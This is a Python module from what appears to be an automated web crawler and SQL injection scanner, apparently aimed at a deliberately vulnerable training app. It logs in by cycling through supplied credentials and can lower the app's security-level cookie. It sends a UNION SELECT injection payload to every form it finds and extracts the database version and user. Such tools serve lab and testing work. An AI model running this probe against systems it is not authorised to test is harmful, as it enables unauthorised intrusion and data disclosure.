import urllib
import re
import time
import json
import src.scraper as scraper
import src.remote as remote
from .utils import trace, dump_response, cookies_override
from .parser import parse, parse_sql_injection_data
from .result import result
from .exceptions import FatalException


# api
def spdr_scope(state):
    # initial state
    if state.target.find('://') == -1:
        state.target = "http://" + state.target
    state.scope = r'https?://' + \
                  re.search(r'//([^/]+)(?:\/|$)', state.target)[1]


def spdr_service_address(state):
    return f"http://{state.service[0]}:{state.service[1]}"


async def spdr_login(url_login, state):
    # authentication
    # TODO: token search based on optional token name

    # parse login for credentials
    # ensure php session id

    trace(0, f"logging in at '{url_login}'")

    scraper_ = scraper.scraper(state)
    response = await scraper_.pull(url_login, follow=True)
    dump_response(response)

    scraper_.cookies_sync(response.headers)

    token = None
    try:
        token = parse(response.body,
                      "form input[name='user_token']", "value")[0]
    except Exception:
        raise FatalException("failed to parse login for token")

    for credentials in state.credentials:
        post_data = {
            'Login': 'Login',
            'user_token': token,
            'username': credentials[0],
            'password': credentials[1],
        }
        body = urllib.parse.urlencode(post_data)
        dump_response(response)
        response = await scraper_.push(url_login, body, follow=True)
        # TODO: deduce login success / failure beyond response code 200
        if response.code == 200:
            return True

    return False


def spdr_security_override(level, headers, state):

    # override security cookie
    res = cookies_override(headers, "security", level)
    trace(2, f"{'overrode' if res == 'updated' else 'set'} security cookie:")
    trace(2, '\n'.join(headers.get_list('cookie')))


async def spdr_inject(url, state):
    # test for sql-injection vulnerability
    trace(1, f"testing for sql-injection vulnerability on form at '{url}'")

    # attempt injection
    scraper_ = scraper.scraper(state)
    post_data = {
        'id': "-1' UNION SELECT @@version, user() #",
        'Submit': "Submit",
    }
    body = urllib.parse.urlencode(post_data)
    response = await scraper_.push(url, body)
    dump_response(response)

    result_ = None
    try:
        data = parse_sql_injection_data(response.body, "pre", "name")
        if len(data) > 0:
            result_ = result(url, list(zip(["version", "user"], data)))
    except Exception:
        pass

    return result_


def spdr_next_url(state):
    next_ = None
    while len(state.url_pools['unprocessed']) > 0:
        with state.mutex['unprocessed']:
            next_ = state.url_pools['unprocessed'].popleft()
        if next_ not in state.url_pools['processed'] and \
           next_ not in state.url_pools['processing']:
            with state.mutex['processing']:
                state.url_pools['processing'][next_] = 1
            break

    return next_


async def spdr_validate_links(parent, links, state):
    if state.mode != "master":
        raise Exception("invalid mode")

    trace(3, f"unprocessed: {len(state.url_pools['unprocessed'])}, " +
             f"processing: {len(state.url_pools['processing'])}, " +
             f"processed: {len(state.url_pools['processed'])}, ")

    trace(4, f"validating links:\n{links}")

    # strip url param variants
    links = [link.split('?')[0] for link in links if link[0] != "?"]

    # fully qualify
    root = re.search(r'(^[^:]*://[^?]+)(?:[?/]|$)', parent)[1]
    links = [urllib.parse.urljoin(root.rstrip('/'), link.lstrip('/'))
             if link.find("://") == -1
             else link for link in links]

    # duplicates
    links = [link for link in links
             if link not in state.url_pools["processed"] and
             link not in state.url_pools["processing"]]

    # scope
    links = [link for link in links
             if re.search(state.scope, link)]

    # blacklist
    def blacklisted(link):
        for s_ in state.blacklist:
            if link.find(s_) > - 1:
                return True
        return False
    links = list(filter(lambda link: not blacklisted(link), links))

    # content type
    scraper_ = scraper.scraper(state)
    links = [link for link in links
             if next(iter(await scraper_.header(link, "content-type")),
                     "").find("html") > -1]

    trace(4, f"validated links:\n{links}")

    return links


async def spdr_add_links(parent, links, state):

    # TODO: single process GIL -> multi-processing and locks
    if parent:
        # finished processing parent url
        with state.mutex['processed']:
            state.url_pools['processed'][parent] = 1
        with state.mutex['processing']:
            del state.url_pools['processing'][parent]

    links = await spdr_validate_links(parent, links, state)
    with state.mutex['unprocessed']:
        state.url_pools['unprocessed'].extend(links)


async def spdr_process_urls(state):

    scraper_ = scraper.scraper(state)
    if state.mode == "master":
        while len(state.url_pools['unprocessed']) > 0:
            url = spdr_next_url(state)
            if state.delay_requests > 0:
                time.sleep(state.delay_requests / 1000)
            links = await scraper_.scrape(url)
            await spdr_add_links(url, links, state)
        trace(2, "no work remaining for master process")
    else:
        client = remote.webclient()
        while True:
            trace(2, "slave: requesting next url")
            response = await client.pull(
                           f"{spdr_service_address(state)}/next_url")
            if response.code == 200:
                if state.delay_requests > 0:
                    time.sleep(state.delay_requests / 1000)
                url = json.loads(response.body)['url']
                links = await scraper_.scrape(url)
                body = json.dumps({'url': url, 'links': links})
                trace(2, "slave: pushing scraped links")
                response = await client.push(
                               f"{spdr_service_address(state)}/add_links",
                               body)
                if response.code != 200:
                    raise FatalException("slave: failed to submit work")
            else:
                trace(2, "no work remaining for slave process")
                break
        return

    forms = []
    scraper_ = scraper.scraper(state)
    if len(state.url_pools['processed']) > 0:
        for url in state.url_pools['processed']:
            response = await scraper_.pull(url)
            dump_response(response)
            if len(parse(response.body, 'form')) > 0:
                forms.append(url)

    trace(0, f"crawled site '{state.target}' and found {len(forms)} " +
          f"url{'s' if len(forms) != 1 else ''} with forms to test")

    if len(forms) > 0:
        for url in forms:
            # test for vulnerability
            result_ = await spdr_inject(url, state)
            if result_:
                state.url_pools['vulnerable'].append(result_)
